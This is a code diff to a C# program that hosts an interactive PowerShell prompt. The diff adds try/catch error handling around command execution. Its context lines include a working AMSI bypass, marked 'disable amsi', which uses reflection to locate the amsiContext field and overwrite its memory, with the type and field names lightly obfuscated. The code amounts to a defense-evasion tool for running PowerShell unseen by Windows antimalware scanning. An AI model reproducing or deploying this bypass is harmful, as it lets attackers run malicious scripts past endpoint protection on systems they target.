@@ -20,12 +20,14 @@ namespace InteractiveRunspace
             // disable amsi
             ps.AddScript(@"$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "" * iUtils"") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "" * Context"") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)");
             ps.Invoke();
-
+            
             while (true)
             {
                 Console.Write("PS " + Directory.GetCurrentDirectory() + ">");
+                Stream inputStream = Console.OpenStandardInput();
+               
                 cmd = Console.ReadLine();
-
+               
                 if (String.Equals(cmd, "exit"))
                     break;
 
@@ -33,15 +35,25 @@ namespace InteractiveRunspace
                 pipeline.Commands.AddScript(cmd);
 
                 pipeline.Commands.Add("Out-String");
-                Collection<PSObject> results = pipeline.Invoke();
-                StringBuilder stringBuilder = new StringBuilder();
 
-                foreach (PSObject obj in results)
+                try
                 {
-                    stringBuilder.Append(obj);
-                }
+                    Collection<PSObject> results = pipeline.Invoke();
+                    StringBuilder stringBuilder = new StringBuilder();
 
-                Console.WriteLine(stringBuilder.ToString().Trim());
+                    foreach (PSObject obj in results)
+                    {
+                        stringBuilder.Append(obj);
+                    }
+
+                    Console.WriteLine(stringBuilder.ToString().Trim());
+                }
+                catch (Exception e)
+                {
+                    Console.WriteLine(e.ToString());
+                }
+                
+               
             }
 
             rs.Close();
